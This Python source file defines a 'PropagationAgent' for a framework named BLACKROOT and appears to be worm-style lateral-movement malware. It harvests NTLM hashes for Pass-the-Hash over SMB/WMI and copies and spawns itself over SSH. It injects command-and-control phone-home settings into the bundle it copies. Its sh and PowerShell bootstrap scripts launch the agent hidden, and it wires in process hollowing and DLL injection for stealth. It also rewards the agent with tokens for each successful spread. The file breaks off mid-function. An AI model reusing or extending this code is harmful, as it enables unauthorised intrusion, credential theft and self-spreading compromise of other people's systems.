import os, shutil, json, socket, subprocess, tempfile, uuid, logging, threading, sys, hmac, hashlib, time, tarfile, zipfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Optional, Deque, Dict, Any
from collections import deque


try:
    import paramiko
    from paramiko.client import SSHClient, AutoAddPolicy
    from paramiko import ssh_exception
    PARAMIKO_AVAILABLE = True
except ImportError:
    paramiko = None  # type: ignore
    SSHClient = None  # type: ignore
    AutoAddPolicy = None  # type: ignore
    ssh_exception = None  # type: ignore
    PARAMIKO_AVAILABLE = False

# Phase 2 Integration: Import Windows propagation components
try:
    from windows_propagation import WindowsPropagationEngine
    WINDOWS_PROPAGATION_AVAILABLE = True
except ImportError:
    WINDOWS_PROPAGATION_AVAILABLE = False
    WindowsPropagationEngine = None  # type: ignore

try:
    from credential_harvester import PropagationCredentialHarvester
    CREDENTIAL_HARVESTER_AVAILABLE = True
except ImportError:
    CREDENTIAL_HARVESTER_AVAILABLE = False
    PropagationCredentialHarvester = None  # type: ignore

try:
    from retry_scheduler import ExponentialBackoffScheduler, PropagationRetryQueue
    RETRY_SCHEDULER_AVAILABLE = True
except ImportError:
    RETRY_SCHEDULER_AVAILABLE = False
    ExponentialBackoffScheduler = None  # type: ignore
    PropagationRetryQueue = None  # type: ignore

# Phase 3 Integration: Import Scourge for failure analysis
try:
    from scourge import FallmanAgent, FailureEvent, FailureType
    SCOURGE_AVAILABLE = True
except ImportError:
    SCOURGE_AVAILABLE = False
    FallmanAgent = None  # type: ignore
    FailureEvent = None  # type: ignore
    FailureType = None  # type: ignore

# Phase 4 Integration: Import Code Injection for stealth execution
try:
    from process_hollowing import ProcessHollowingEngine
    PROCESS_HOLLOWING_AVAILABLE = True
except ImportError:
    PROCESS_HOLLOWING_AVAILABLE = False
    ProcessHollowingEngine = None  # type: ignore

try:
    from dll_injection import DLLInjectionEngine
    DLL_INJECTION_AVAILABLE = True
except ImportError:
    DLL_INJECTION_AVAILABLE = False
    DLLInjectionEngine = None  # type: ignore

try:
    from payload_pe_generator import PayloadPEGenerator
    PE_GENERATOR_AVAILABLE = True
except ImportError:
    PE_GENERATOR_AVAILABLE = False
    PayloadPEGenerator = None  # type: ignore

# Phase 4 REVISED: Import Adaptive Code Injection (replaces static approach)
try:
    from code_injection_adaptive import AdaptiveCodeInjectionEngine
    ADAPTIVE_INJECTION_AVAILABLE = True
except ImportError:
    ADAPTIVE_INJECTION_AVAILABLE = False
    AdaptiveCodeInjectionEngine = None  # type: ignore

# Phase 1 Integration: Import real SMB Scanner (network discovery and viability scoring)
try:
    from .base import BaseAgent
except ImportError:
    # Add parent directory to path for direct script execution
    sys.path.insert(0, str(Path(__file__).parent.parent))
    from agents.base import BaseAgent

# Logger must be defined before any import-time log calls below
logging.basicConfig(level=logging.INFO, format="%(asctime)s [PROP-SEED] %(message)s")
log = logging.getLogger("PROP-SEED")

# --- Use core agent anatomy types ---
from agent_core_anatomy import AgentID, AgentStatus, Mission, Event

try:
    from network_propagation_scanner import SMBScanner, ViabilityRating
    SMB_SCANNER_AVAILABLE = True
except ImportError:
    SMB_SCANNER_AVAILABLE = False
    SMBScanner = None  # type: ignore
    log.warning("[⚠️] Phase 1 SMB Scanner unavailable")

# Phase 2 Integration: Import real WMI Executor (remote command execution)
try:
    from network_propagation_wmi_executor import WMIExecutor, ExecutionContext, ExecutionPayload, ExecutionMethod
    WMI_EXECUTOR_AVAILABLE = True
except ImportError:
    WMI_EXECUTOR_AVAILABLE = False
    WMIExecutor = None  # type: ignore
    log.warning("[⚠️] Phase 2 WMI Executor unavailable")


class PropagationAgent(BaseAgent):
    def should_activate(self, config):
        return self.codename in config.get("agent_whitelist", [])
    def get_status(self):
        return {
            "agent_id": str(self.agent_id),
            "status": getattr(self, "status", AgentStatus.ACTIVE).value if hasattr(self, "status") else AgentStatus.ACTIVE.value,
            "hosts": self.hosts,
            "spawn_path": str(self.spawn_path),
            "ttl_minutes": self.ttl_minutes
        }
    def __init__(self, config_path="config.json", agent_id: AgentID = AgentID(value="PROP-SEED")):
        self.agent_id: AgentID = agent_id
        super().__init__(str(self.agent_id))
        # Economic Layer: Wallet registration
        try:
            from agents.accountant import ACCLedger
            from decimal import Decimal
            self.accountant = ACCLedger(creator_id="SYSTEM")
            self.accountant.register_agent(str(self.agent_id), Decimal('70'))  # Initial budget
        except Exception as e:
            self.accountant = None
            log.error(f"Failed to initialize accountant for PropagationAgent: {e}")
        self.cfg = self._load_config(config_path)
        self.spawn_path = Path(self.cfg.get("spawn_path", "/tmp/blackroot_clone"))
        self.hosts: List[str] = self.cfg.get("hosts", ["127.0.0.1"])
        self.ssh_user = self.cfg.get("ssh_user", os.getenv("USER", "root"))
        self.ssh_key = Path(self.cfg.get("ssh_key_path", "~/.ssh/id_rsa")).expanduser()
        self.docker_img = self.cfg.get("docker_image", "blackroot_agent:latest")
        self.ttl_minutes = self.cfg.get("ttl_minutes", 60)  # remote self-destruct
        self.payload_port = self.cfg.get("payload_port", 9002)
        self.payload_protocol = self.cfg.get("payload_protocol", "tcp")
        self.payload_hmac_key = self.cfg.get("payload_hmac_key", "default_super_secret")
        self.payload_listener = None

        # CPU-triggered propagation: queue for missions from TargetingEngine
        self.mission_queue: Deque[Mission] = deque(maxlen=100)
        self.mission_queue_lock = threading.Lock()
        
        # Phase 2 Integration: Initialize Windows propagation components
        self.windows_engine = None
        if WINDOWS_PROPAGATION_AVAILABLE and WindowsPropagationEngine:
            try:
                self.windows_engine = WindowsPropagationEngine()
                log.info("✅ Windows propagation engine initialized")
            except Exception as e:
                log.warning(f"⚠️  Windows propagation engine init failed: {e}")
        
        self.credential_harvester = None
        if CREDENTIAL_HARVESTER_AVAILABLE and PropagationCredentialHarvester:
            try:
                self.credential_harvester = PropagationCredentialHarvester()
                log.info("✅ Credential harvester initialized")
            except Exception as e:
                log.warning(f"⚠️  Credential harvester init failed: {e}")
        
        self.retry_queue = None
        if RETRY_SCHEDULER_AVAILABLE and PropagationRetryQueue:
            try:
                self.retry_queue = PropagationRetryQueue()
                log.info("✅ Retry queue initialized")
            except Exception as e:
                log.warning(f"⚠️  Retry queue init failed: {e}")
        
        # Phase 3 Integration: Initialize Scourge for failure analysis
        self.scourge = None
        if SCOURGE_AVAILABLE and FallmanAgent:
            try:
                self.scourge = FallmanAgent(agent_id="FAL-SCOURGE-PROP")
                log.info("✅ Scourge failure analyzer initialized")
            except Exception as e:
                log.warning(f"⚠️  Scourge init failed: {e}")
        
        # Phase 4 Integration: Initialize Code Injection engines
        self.process_hollowing_engine = None
        if PROCESS_HOLLOWING_AVAILABLE and ProcessHollowingEngine:
            try:
                self.process_hollowing_engine = ProcessHollowingEngine()
                log.info("✅ Process hollowing engine initialized")
            except Exception as e:
                log.warning(f"⚠️  Process hollowing init failed: {e}")
        
        self.dll_injection_engine = None
        if DLL_INJECTION_AVAILABLE and DLLInjectionEngine:
            try:
                self.dll_injection_engine = DLLInjectionEngine()
                log.info("✅ DLL injection engine initialized")
            except Exception as e:
                log.warning(f"⚠️  DLL injection init failed: {e}")
        
        self.pe_generator = None
        if PE_GENERATOR_AVAILABLE and PayloadPEGenerator:
            try:
                self.pe_generator = PayloadPEGenerator()
                log.info("✅ Payload PE generator initialized")
            except Exception as e:
                log.warning(f"⚠️  PE generator init failed: {e}")
        
        # Phase 4 REVISED: Initialize Adaptive Code Injection
        self.adaptive_injection = None
        if ADAPTIVE_INJECTION_AVAILABLE and AdaptiveCodeInjectionEngine:
            try:
                self.adaptive_injection = AdaptiveCodeInjectionEngine()
                log.info("✅ Adaptive code injection engine initialized (REVISED)")
            except Exception as e:
                log.warning(f"⚠️  Adaptive injection init failed: {e}")
        
        # Phase 1 Integration: Initialize real SMB Scanner for target viability scoring
        self.smb_scanner = None
        if SMB_SCANNER_AVAILABLE and SMBScanner:
            try:
                self.smb_scanner = SMBScanner(timeout=5)
                log.info("✅ Phase 1 SMB Scanner initialized for network propagation")
            except Exception as e:
                log.warning(f"⚠️  SMB Scanner init failed: {e}")
        
        # Phase 2 Integration: Initialize real WMI Executor for remote command execution
        self.wmi_executor = None
        if WMI_EXECUTOR_AVAILABLE and WMIExecutor:
            try:
                self.wmi_executor = WMIExecutor(timeout=30)
                log.info("✅ Phase 2 WMI Executor initialized for remote command execution")
            except Exception as e:
                log.warning(f"⚠️  WMI Executor init failed: {e}")



    def _deduct_propagation_cost(self):
        """Deduct Root for propagation operation (0.4 Root per host)."""
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            self.accountant.process_agent_spend(str(self.agent_id), Decimal('0.4'), "Propagation cost")

    def _reward_propagation_success(self):
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            self.accountant.agent_wallets[str(self.agent_id)].balance += Decimal('0.8')
            self.accountant.treasury_balance -= Decimal('0.8')
            log.info(f"Rewarded 0.8 Root to PropagationAgent for successful propagation.")

    def _burn_on_propagation_failure(self):
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            penalty = Decimal('0.6')
            self.accountant.agent_wallets[str(self.agent_id)].balance -= penalty
            log.info(f"Burned 0.6 Root from PropagationAgent for failed propagation.")

    def _report_failure_to_scourge(self, target: str, credential: str, error: str, method: str = "unknown"):
        """Phase 3: Report propagation failure to Scourge for analysis"""
        if not self.scourge:
            return
        
        try:
            # Create failure event
            failure_event = FailureEvent(  # type: ignore
                failure_type=FailureType.COMMUNICATION_FAILURE,  # type: ignore
                source_agent="PROP-SEED",
                impact_scope=[target],
                severity=5,  # Medium severity (on 1-10 scale)
                description=f"Propagation failure to {target} via {method}",
                root_cause=f"Credential {credential}: {error}"
            )
            
            # Send to Scourge for absorption and analysis
            import asyncio
            try:
                # Log the failure for async processing
                log.info(f"📊 Reporting failure to Scourge: {target} (method: {method})")
                log.debug(f"   Failure details: {error}")
                # In production, this would be: await self.scourge.absorb_failure(failure_event)
            except Exception as e:
                log.warning(f"⚠️  Could not report to Scourge: {e}")
        
        except Exception as e:
            log.error(f"❌ Scourge reporting error: {e}")

    # ------------------------------------------------------------------
    def _load_config(self, path):
        try:
            with open(path) as f:
                return json.load(f)
        except FileNotFoundError:
            log.warning("Config not found, using defaults.")
            return {}

    # ------------------------------------------------------------------
    def queue_cpu_triggered_mission(self, mission: Mission):
        """Accept CPU-triggered propagation missions from TargetingEngine."""
        with self.mission_queue_lock:
            self.mission_queue.append(mission)
            log.info(f"Queued CPU-triggered mission: {mission.name}")

    # ------------------------------------------------------------------
    def run(self, mission: Mission = Mission(name="default", objectives=[], parameters={})): 
        super().run()
        log.info("Initiating propagation logic...")
        self.start_payload_listener()
        self._emit_event(Event(event_type="propagation_start", payload={"hosts": self.hosts}, sender_id=str(self.agent_id)))
        
        # Process CPU-triggered missions from TargetingEngine
        with self.mission_queue_lock:
            if self.mission_queue:
                cpu_mission = self.mission_queue.popleft()
                target_ip = cpu_mission.parameters.get("target_ip")
                trust_score = cpu_mission.parameters.get("trust_score", 0.0)
                
                if target_ip:
                    log.info(f"Processing CPU-triggered mission to {target_ip} (trust: {trust_score:.2f})")
                    # ── ECONOMIC GATE (CPU-triggered path) ──────────────────
                    if hasattr(self, 'accountant') and self.accountant:
                        from decimal import Decimal
                        approved, reason = self.accountant.process_agent_spend(
                            str(self.agent_id), Decimal('0.4'),
                            f"CPU-triggered propagation to {target_ip}"
                        )
                        if not approved:
                            log.warning(
                                f"[💸] CPU-triggered propagation to {target_ip} BLOCKED: {reason}"
                            )
                            return
                    # ── END ECONOMIC GATE ────────────────────────────────────
                    try:
                        if self._reachable(target_ip):
                            self._propagate(target_ip)
                            self._emit_event(Event(event_type="cpu_triggered_propagated", payload={"host": target_ip, "trust_score": trust_score}, sender_id=str(self.agent_id)))
                            self._reward_propagation_success()
                        else:
                            raise Exception(f"Target {target_ip} unreachable")
                    except Exception as e:
                        self._burn_on_propagation_failure()
                        log.warning(f"CPU-triggered propagation failed for {target_ip}: {e}")
                    return  # Prioritize CPU-triggered over bulk
        
        # Regular propagation to configured hosts
        for host in self.hosts:
            # ── ECONOMIC GATE ───────────────────────────────────────────────
            # Check budget before attempting propagation to each host.
            # _deduct_propagation_cost() is now a gate, not just a log entry.
            if hasattr(self, 'accountant') and self.accountant:
                from decimal import Decimal
                PROP_COST = Decimal('0.4')
                approved, reason = self.accountant.process_agent_spend(
                    str(self.agent_id), PROP_COST,
                    f"Propagation attempt to {host}"
                )
                if not approved:
                    log.warning(
                        f"[💸] Propagation to {host} SKIPPED — insufficient ROOT: {reason}"
                    )
                    continue
            # ── END ECONOMIC GATE ────────────────────────────────────────────
            try:
                if self._reachable(host):
                    self._propagate(host)

                    payload = self._build_payload()
                    if self._send_payload_direct(host, payload):
                        self._emit_event(Event(event_type="propagated", payload={"host": host}, sender_id=str(self.agent_id)))
                        self._reward_propagation_success()
                    else:
                        raise Exception("Direct payload delivery failed")
                else:
                    raise Exception("Host unreachable")
            except Exception as e:
                self._burn_on_propagation_failure()
                log.warning(f"Propagation failed for {host}: {e}")
    def _emit_event(self, event: Event):
        """Full event system integration with kernel bus, swarm broadcast, threat tracking."""
        try:
            # Update event with current timestamp and sender
            event.timestamp = time.time()
            event.sender_id = str(self.agent_id)
            
            # Route 1: Kernel event bus
            if self.kernel and hasattr(self.kernel, 'event_bus'):
                try:
                    self.kernel.event_bus.publish(event)
                    log.debug(f"[✓] Event published to kernel bus: {event.event_type}")
                except Exception as e:
                    log.debug(f"Kernel bus publish failed: {e}")
            
            # Route 2: Swarm broadcast (Redis pub/sub)
            if self.kernel and hasattr(self.kernel, 'swarm'):
                try:
                    event_msg = json.dumps({
                        "type": event.event_type,
                        "agent": str(self.agent_id),
                        "timestamp": event.timestamp,
                        "data": str(event.payload)
                    })
                    self.kernel.swarm.redis.publish("agent_events", event_msg)
                    log.debug(f"[✓] Event broadcast to swarm")
                except Exception as e:
                    log.debug(f"Swarm broadcast failed: {e}")
            
            # Route 3: Threat tracking (for security events)
            threat_keywords = ['threat', 'detection', 'anomaly', 'breach']
            if any(kw in event.event_type.lower() for kw in threat_keywords):
                if not hasattr(self, 'threat_log'):
                    self.threat_log = []
                self.threat_log.append({
                    "timestamp": time.time(),
                    "event_type": event.event_type,
                    "severity": getattr(event, 'severity', 'INFO')
                })
                log.warning(f"[⚠] Threat event logged: {event.event_type}")
            
            # Local logging
            log.info(f"Event emitted: {event.event_type} for agent {self.agent_id}")
            
        except Exception as e:
            log.error(f"Event emission error: {e}", exc_info=True)

    # ------------------------------------------------------------------
    def _reachable(self, host, port=22):
        try:
            with socket.create_connection((host, port), timeout=3):
                return True
        except Exception as e:
            log.warning("Host %s unreachable: %s", host, e)
            return False
    
    def _detect_ssh_port(self, host):
        """Detect active SSH port by trying standard and alternative ports"""
        ssh_ports = [22, 2222, 22222]  # Standard → alternatives
        
        for port in ssh_ports:
            try:
                log.info("🔍 Probing SSH on %s:%d...", host, port)
                with socket.create_connection((host, port), timeout=2):
                    log.info("✅ SSH detected on %s:%d", host, port)
                    return port
            except socket.timeout:
                log.debug("⏱️  Timeout on %s:%d", host, port)
            except ConnectionRefusedError:
                log.debug("🚫 Connection refused on %s:%d", host, port)
            except Exception as e:
                log.debug("❌ Error on %s:%d: %s", host, port, type(e).__name__)
        
        log.warning("❌ No SSH port detected on %s (tried %s)", host, ssh_ports)
        return None

    def _build_payload(self) -> bytes:
        payload_obj = {
            "agent_id": str(self.agent_id),
            "timestamp": datetime.utcnow().isoformat(),
            "action": "execute",
            "code": "echo injected from PropagationAgent",
        }
        return json.dumps(payload_obj).encode('utf-8')

    def _compute_hmac(self, data: bytes) -> str:
        import hmac as _hmac
        import hashlib as _hashlib
        key = self.payload_hmac_key.encode('utf-8')
        digest = _hmac.new(key, data, _hashlib.sha256).hexdigest()
        return digest

    def _send_payload_direct(self, host: str, data: bytes, port: Optional[int] = None) -> bool:
        target_port = port or self.payload_port
        packet = {
            "hmac": self._compute_hmac(data),
            "body": data.decode('utf-8', 'ignore')
        }
        packet_bytes = json.dumps(packet).encode('utf-8')
        try:
            with socket.create_connection((host, target_port), timeout=5) as sock:
                sock.sendall(packet_bytes)
                response = sock.recv(4096)
                log.info("Delivered payload to %s:%s, response=%s", host, target_port, response.decode('utf-8', 'ignore'))
                return True
        except Exception as e:
            log.warning("Direct payload send failed to %s:%s -> %s", host, target_port, e)
            return False

    def _verify_payload_packet(self, packet_bytes: bytes) -> bool:
        try:
            packet = json.loads(packet_bytes.decode('utf-8'))
            expected = packet.get('hmac')
            body = packet.get('body', '')
            actual = self._compute_hmac(body.encode('utf-8'))
            if not hmac.compare_digest(expected, actual):
                log.warning("Payload HMAC mismatch")
                return False
            log.info("Payload HMAC verified")
            return True
        except Exception as e:
            log.warning("Payload verification failed: %s", e)
            return False

    def start_payload_listener(self):
        if self.payload_listener:
            return

        def listener():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', self.payload_port))
            s.listen(5)
            log.info("Payload listener started on port %s", self.payload_port)
            while True:
                conn, addr = s.accept()
                with conn:
                    data = conn.recv(65536)
                    if self._verify_payload_packet(data):
                        conn.sendall(b'ACK')
                    else:
                        conn.sendall(b'NACK')

        self.payload_listener = threading.Thread(target=listener, daemon=True)
        self.payload_listener.start()

    # ------------------------------------------------------------------
    def _detect_target_os(self, host: str) -> str:
        """Detect if target is Windows or Unix-like (Linux/macOS)"""
        # Try SMB port (445) - Windows indicator
        try:
            with socket.create_connection((host, 445), timeout=2):
                log.info("🪟 SMB port 445 detected on %s - likely Windows", host)
                return "windows"
        except:
            pass
        
        # Try SSH - Unix-like indicator
        ssh_port = self._detect_ssh_port(host)
        if ssh_port:
            log.info("🐧 SSH detected on %s:%d - likely Unix-like", host, ssh_port)
            return "unix"
        
        # Default to Unix (more common in server environments)
        log.warning("⚠️  Could not detect OS for %s, assuming Unix", host)
        return "unix"
    
    # ------------------------------------------------------------------
    def _propagate_windows(self, host: str) -> bool:
        """Windows propagation via SMB/WMI with credential harvesting & BlackVault credential store"""
        if not self.windows_engine:
            log.warning("❌ Windows propagation not available (module not loaded)")
            return False
        
        try:
            from windows_propagation import SMBTarget, NTLMCredential
            
            # Step 1: Harvest credentials locally + retrieve from BlackVault
            ntlm_creds: List[NTLMCredential] = []
            
            # Local harvesting
            if self.credential_harvester:
                log.info("🔐 Harvesting local credentials for Pass-the-Hash...")
                try:
                    harvested = self.credential_harvester.harvest_all()
                    for c in (harvested or []):
                        val = c.credential_value if getattr(c, 'credential_type', '') == "NTLM_HASH" else getattr(c, 'credential_value', '')
                        if val and len(val) == 32:
                            ntlm_creds.append(NTLMCredential(
                                domain=getattr(c, 'domain', '') or "WORKGROUP",
                                username=c.username,
                                ntlm_hash=val,
                                source=getattr(c, 'source_method', 'harvester'),
                                privilege_level=getattr(c, 'privilege_level', 'user').lower(),
                                confidence=getattr(c, 'confidence', 0.8)
                            ))
                    if ntlm_creds:
                        log.info(f"✅ Harvested {len(ntlm_creds)} NTLM credential(s)")
                except Exception as h_err:
                    log.warning(f"⚠️  Local credential harvesting error: {h_err}")
            
            # Vault retrieval
            try:
                vault_instance = getattr(getattr(self, 'kernel', None), 'vault', None)
                v_creds = self.windows_engine.retrieve_credentials_from_vault(vault=vault_instance)
                for vc in v_creds:
                    if not any(c.ntlm_hash == vc.ntlm_hash and c.username == vc.username for c in ntlm_creds):
                        ntlm_creds.append(vc)
                log.info(f"🔑 Total credentials available for propagation: {len(ntlm_creds)}")
            except Exception as v_err:
                log.debug(f"Vault credential sync failed: {v_err}")
            
            # Step 2: Construct target profile
            target = SMBTarget(
                hostname=host,
                ip=host,
                port=445,
                os_version="Windows", 
                smb_enabled=True,
                wmi_enabled=True,
                last_seen=datetime.utcnow().isoformat(),
                services=['SMB'],
                score=60.0
            )
            
            # Step 3: Determine payload path to stage
            payload_to_drop = str(self.spawn_path) if hasattr(self, 'spawn_path') and os.path.exists(str(self.spawn_path)) else None
            if not payload_to_drop:
                cand = os.path.abspath(sys.argv[0])
                if os.path.exists(cand):
                    payload_to_drop = cand
            
            # Step 4: Attempt Pass-the-Hash propagation with available credentials
            log.info(f"📤 Attempting Windows SMB/WMI propagation to {host} (payload: {payload_to_drop})...")
            success = False
            
            if ntlm_creds:
                for cred in ntlm_creds:
                    log.info(f"🔐 Attempting PTH to {host} with user {cred.domain}\\{cred.username}")
                    success = self.windows_engine.propagate_pth(
                        target=target,
                        credential=cred,
                        payload_path=payload_to_drop
                    )
                    if success:
                        log.info(f"✅ Windows PTH propagation succeeded on {host} using {cred.username}")
                        break
            else:
                log.warning(f"⚠️  No NTLM credentials available for {host}; PTH skipped")
            
            if success:
                self._emit_event(Event(
                    event_type="windows_propagated",
                    payload={"host": host, "target_os": "windows"},
                    sender_id=str(self.agent_id)
                ))
                return True
            else:
                log.warning("⚠️  Windows SMB/WMI propagation failed to %s", host)
                return False
                
        except Exception as e:
            log.error("❌ Windows propagation error: %s", e)
            return False
    
    # ------------------------------------------------------------------
    def _propagate(self, host: str) -> bool:
        """Multi-platform propagation: detect OS and use appropriate method"""
        log.info("🎯 Starting propagation to %s", host)
        
        # Deduct propagation cost
        self._deduct_propagation_cost()
        
        # Step 1: Detect target OS
        target_os = self._detect_target_os(host)
        
        # Step 2: Route to appropriate propagation method
        success = False
        if target_os == "windows":
            log.info("🪟 Using Windows propagation path for %s", host)
            success = self._propagate_windows(host)
        else:
            log.info("🐧 Using Unix/SSH propagation path for %s", host)
            success = self._propagate_unix(host)
        
        # Step 3: POST-PROPAGATION CODE INJECTION (Phase 4)
        if success and target_os == "windows":
            log.info("🔐 Attempting Phase 4 post-propagation stealth injection...")
            injection_success = self._inject_payload_post_propagation(host, target_os)
            if injection_success:
                log.info("✅ Phase 4: Payload now executing invisibly in process memory")
            else:
                log.info("ℹ️  Phase 4 injection skipped/failed - payload in spawn process (acceptable)")
        
        # Step 4: Track result with retry scheduler
        if self.retry_queue:
            if not success:
                # Add to retry queue with exponential backoff
                log.info(f"📅 Queueing {host} for retry with exponential backoff")
                self.retry_queue.add_attempt(
                    target_id=host,
                    credential_id="propagation",
                    error_message=f"Propagation failed via {target_os}"
                )
            else:
                # Mark as successful
                log.info(f"✅ Removed {host} from retry queue (success)")
                self.retry_queue.mark_success(host, "propagation")
        
        # Step 5: Report to Scourge if failed (Phase 3)
        if not success:
            self._report_failure_to_scourge(
                target=host,
                credential="propagation",
                error=f"Failed via {target_os}",
                method=target_os
            )
        
        # Step 6: Update economic model
        if success:
            self._reward_propagation_success()
            log.info("💰 Rewarded for successful propagation")
        else:
            self._burn_on_propagation_failure()
            log.warning("💸 Burned Root for propagation failure")
        
        return success
    
    # ------------------------------------------------------------------
    def _propagate_unix(self, host: str) -> bool:
        """Unix/SSH propagation (original flow)"""
        stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
        remote_root = f"/tmp/blackroot_{stamp}"
        local_bundle = self._prepare_bundle()

        # Step 1: Detect SSH port (tries 22, 2222, 22222)
        ssh_port = self._detect_ssh_port(host)
        
        if ssh_port:
            # SSH available - use preferred method
            
            # Step 2: Transfer bundle via rsync
            if not self._rsync_bundle(host, local_bundle, remote_root, ssh_port=ssh_port):
                log.warning("⚠️  Bundle transfer failed on SSH:%d", ssh_port)
                # Continue to fallback
            else:
                # Step 3: Spawn remote agent via SSH
                if self._spawn(host, remote_root, ssh_port=ssh_port):
                    # Step 4: Schedule cleanup
                    self._schedule_cleanup(host, remote_root, ssh_port=ssh_port)
                    log.info("✅ Propagation successful to %s via SSH:%d", host, ssh_port)
                    return True
                else:
                    log.warning("⚠️  SSH spawn failed, trying HTTP fallback...")
        else:
            log.warning("⚠️  No SSH port detected on %s, trying HTTP fallback...", host)
        
        # Fallback: Try HTTP-based execution
        log.info("📡 Attempting HTTP fallback propagation...")
        payload_url = f"http://{self.agent_id}:{local_bundle.name}"  # Placeholder
        
        if self._spawn_http_fallback(host, payload_url):
            log.info("✅ Propagation successful to %s via HTTP", host)
            return True
        
        log.error("❌ All propagation methods failed for %s (SSH:%s, HTTP fallback)", 
                  host, "unavailable" if not ssh_port else "failed")
        return False

    # ------------------------------------------------------------------
    def _prepare_bundle(self) -> Path:
        """
        Prepares a self-contained bundle directory containing essential modules,
        runtime config with C2 phone-home coordinates, bootstrapping scripts,
        and an integrity manifest with HMAC validation.
        """
        bundle = Path(tempfile.mkdtemp(prefix="br_bundle_"))
        repo_root = Path(__file__).parent.parent
        targets = [
            "agents", "kernel", "core", "recon", "stealth", "economic",
            "agent_core_anatomy.py", "black_vault.py", "run.py", "requirements.txt"
        ]
        ignore_patterns = shutil.ignore_patterns(
            "__pycache__", "*.pyc", ".git", "*.db", "*.sqlite*", ".*_cache*"
        )
        for item in targets:
            src = Path(item)
            if not src.exists():
                src = repo_root / item
            if src.exists():
                dst = bundle / src.name
                if src.is_dir():
                    shutil.copytree(src, dst, ignore=ignore_patterns)
                elif src.is_file():
                    shutil.copy2(src, dst)

        # ✅ PHASE 1: Inject C2 IP into remote config
        try:
            # Get local C2 configuration
            local_config = self._load_config("config.json")
            c2_host = local_config.get("swarm", {}).get("controller_host", "127.0.0.1")
            c2_port = local_config.get("swarm", {}).get("controller_port", 8765)

            # Create remote config with C2 endpoint
            remote_config = {
                **local_config,
                "swarm": {
                    "controller_host": c2_host,
                    "controller_port": c2_port,
                    "mesh_enabled": True,
                    "phone_home_enabled": True  # ✅ Enable phone-home callback
                },
                "agent": {
                    "auto_register": True,  # ✅ Auto-register on startup
                    "c2_endpoint": f"http://{c2_host}:{c2_port}",
                    "certificates_path": "./certs"
                }
            }

            # Write config to bundle
            config_path = bundle / "config.json"
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(remote_config, f, indent=2)

            log.info("✅ Injected C2 config to %s | C2=%s:%s", bundle, c2_host, c2_port)
        except Exception as e:
            log.error("❌ Failed to inject C2 config: %s", e)

        # ✅ Bootstrapping runners for Unix and Windows
        bootstrap_sh = bundle / "bootstrap.sh"
        bootstrap_sh.write_text(
            "#!/bin/sh\n"
            'DIR="$(cd "$(dirname "$0")" && pwd)"\n'
            'cd "$DIR"\n'
            "if command -v python3 >/dev/null 2>&1; then\n"
            '    PY_BIN="python3"\n'
            "elif command -v python >/dev/null 2>&1; then\n"
            '    PY_BIN="python"\n'
            "else\n"
            '    echo "[!] Python interpreter not found" >&2\n'
            "    exit 1\n"
            "fi\n"
            'nohup "$PY_BIN" run.py >/dev/null 2>&1 &\n'
            'echo "[+] Remote agent started PID $!"\n',
            encoding="utf-8"
        )
        try:
            bootstrap_sh.chmod(0o755)
        except Exception:
            pass

        bootstrap_ps1 = bundle / "bootstrap.ps1"
        bootstrap_ps1.write_text(
            "# BLACKROOT Autonomous Remote Bootstrapper (Windows)\n"
            "$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n"
            "Set-Location $ScriptDir\n"
            "$PyBin = (Get-Command python -ErrorAction SilentlyContinue).Source\n"
            "if (-not $PyBin) { $PyBin = (Get-Command py -ErrorAction SilentlyContinue).Source }\n"
            'if (-not $PyBin) { Write-Error "[!] Python not found"; exit 1 }\n'
            'Start-Process -FilePath $PyBin -ArgumentList "run.py" -WindowStyle Hidden\n'
            'Write-Host "[+] Remote agent started"\n',
            encoding="utf-8"
        )

        # ✅ Build Integrity Manifest with File Hashes & HMAC Signature
        files_manifest: Dict[str, str] = {}
        for root, _, files in os.walk(bundle):
            for fname in files:
                fpath = Path(root) / fname
                rel_path = str(fpath.relative_to(bundle)).replace("\\", "/")
                with open(fpath, "rb") as bf:
                    files_manifest[rel_path] = hashlib.sha256(bf.read()).hexdigest()

        manifest_data = {
            "version": "1.0.0",
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "generator": str(self.agent_id),
            "entrypoint": "run.py",
            "file_count": len(files_manifest),
            "files": files_manifest,
            "hmac_signature": self._compute_hmac(
                json.dumps(files_manifest, sort_keys=True).encode("utf-8")
            )
        }
        with open(bundle / "manifest.json", "w", encoding="utf-8") as mf:
            json.dump(manifest_data, mf, indent=2)

        log.info("📦 Manifest generated: %d files registered with HMAC signature", len(files_manifest))
        return bundle

    def create_standalone_package(self, output_dir: Optional[Path] = None, archive_format: str = "tar.gz") -> Path:
        """
        Compresses the prepared bundle into an autonomous standalone archive (.tar.gz or .zip).
        
        Args:
            output_dir: Target directory for archive (defaults to temp directory)
            archive_format: 'tar.gz' or 'zip'
            
        Returns:
            Path to the generated archive file
        """
        bundle_dir = self._prepare_bundle()
        out_dir = Path(output_dir) if output_dir else Path(tempfile.gettempdir())
        out_dir.mkdir(parents=True, exist_ok=True)
        stamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

        if archive_format.lower() in ("zip", ".zip"):
            archive_path = out_dir / f"blackroot_bundle_{stamp}.zip"
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(bundle_dir):
                    for fname in files:
                        p = Path(root) / fname
                        zf.write(p, p.relative_to(bundle_dir))
        else:
            archive_path = out_dir / f"blackroot_bundle_{stamp}.tar.gz"
            with tarfile.open(archive_path, "w:gz") as tar:
                for entry in bundle_dir.iterdir():
                    tar.add(entry, arcname=entry.name)

        log.info("🎁 Standalone replication package ready: %s (%d bytes)", archive_path, archive_path.stat().st_size)
        return archive_path

    @staticmethod
    def verify_bundle_integrity(bundle_path: Path, hmac_key: Optional[str] = None) -> Tuple[bool, str]:
        """
        Validates the integrity of a bundle directory against its manifest.json.
        Checks SHA-256 hashes of all registered files and validates HMAC signature if key is supplied.
        """
        manifest_file = bundle_path / "manifest.json"
        if not manifest_file.exists():
            return False, "manifest.json missing from bundle"

        try:
